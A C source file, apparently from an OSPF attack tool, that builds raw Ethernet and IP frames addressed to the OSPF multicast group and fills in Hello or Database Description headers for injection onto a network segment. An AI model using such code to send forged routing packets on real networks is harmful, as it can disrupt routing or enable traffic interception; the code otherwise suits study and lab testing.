#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>

#include "ospf_attack.h"
#include "ospf.h"
#include "checksum.h"

/*
int build_hello(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, unsigned char *dest_mac, char *dest_ip) {
  // Ethernet header
  struct ether_header *eth_header;
  eth_header = (struct ether_header *) &buffer[0];
  memcpy(eth_header->ether_dhost, dest_mac, MAC_ADDR_LEN);
  memcpy(eth_header->ether_shost, local_mac, MAC_ADDR_LEN);
  eth_header->ether_type = htons(0X800);

  // IP header
  struct ip *ip_header;
  ip_header = (struct ip *) &buffer[sizeof(struct ether_header)];
  ip_header->ip_hl = 0X5; //sizeof(ip_header);
  ip_header->ip_v = 4;
  ip_header->ip_tos = 0xc0;
  ip_header->ip_len = htons(sizeof(struct ip) + sizeof(struct ospf) + sizeof(struct ospf_hello)+12);//0X2800; //sizeof(struct ip);
  ip_header->ip_id = htons((int)(rand()/(((double)RAND_MAX + 1)/14095)));
  ip_header->ip_off = 0;
  ip_header->ip_ttl = 1;
  ip_header->ip_p = PROTO_OSPF;
  ip_header->ip_sum = 0X0000; 
  ip_header->ip_src.s_addr = inet_addr(local_ip);
  ip_header->ip_dst.s_addr = inet_addr(dest_ip);
  ip_header->ip_sum = in_cksum((unsigned short*)ip_header, sizeof(struct ip));
  int swap = build_hello_header_ospf(buffer, local_ip, dest_ip);
  
  int packet_len = sizeof(struct ether_header) + sizeof(struct ip) + swap;
  
  return packet_len;
}
*/

int build(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, __u8 packet_type) {
  // Ethernet header
  char *dest_ip = "224.0.0.5";
  unsigned char *dest_mac  = parse_mac_addr("01:00:5e:00:00:05");
  struct ether_header *eth_header;
  eth_header = (struct ether_header *) &buffer[0];
  memcpy(eth_header->ether_dhost, dest_mac, MAC_ADDR_LEN);
  memcpy(eth_header->ether_shost, local_mac, MAC_ADDR_LEN);
  eth_header->ether_type = htons(0X800);

  // IP header
  struct ip *ip_header;
  ip_header = (struct ip *) &buffer[sizeof(struct ether_header)];
  ip_header->ip_hl = 0X5; //sizeof(ip_header);
  ip_header->ip_v = 4;
  ip_header->ip_tos = 0xc0;
  ip_header->ip_len = htons(sizeof(struct ip) + sizeof(struct ospf) + sizeof(struct ospf_hello)+12);//0X2800; //sizeof(struct ip);
  ip_header->ip_id = htons((int)(rand()/(((double)RAND_MAX + 1)/14095)));
  ip_header->ip_off = 0;
  ip_header->ip_ttl = 1;
  ip_header->ip_p = PROTO_OSPF;
  ip_header->ip_sum = 0X0000; 
  ip_header->ip_src.s_addr = inet_addr(local_ip);
  ip_header->ip_dst.s_addr = inet_addr(dest_ip);
  ip_header->ip_sum = in_cksum((unsigned short*)ip_header, sizeof(struct ip));
  
  int packet_len, swap;
  
  if(packet_type - 0x01) {
    swap = build_database_description_header_ospf(buffer, local_ip, dest_ip, 0x07);
    packet_len = sizeof(struct ether_header) + sizeof(struct ip) + swap;
  } else {
    swap = build_hello_header_ospf(buffer, local_ip, dest_ip);
    packet_len = sizeof(struct ether_header) + sizeof(struct ip) + swap;
  }
  
  return packet_len;
}

// Based on http://stackoverflow.com/a/3409211
unsigned char *parse_mac_addr(char *mac_str) {
  unsigned char *result = calloc(MAC_ADDR_LEN, sizeof(unsigned char));
  sscanf(mac_str, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", result, result + 1, result + 2, result + 3, result + 4, result + 5);
  return result;
}
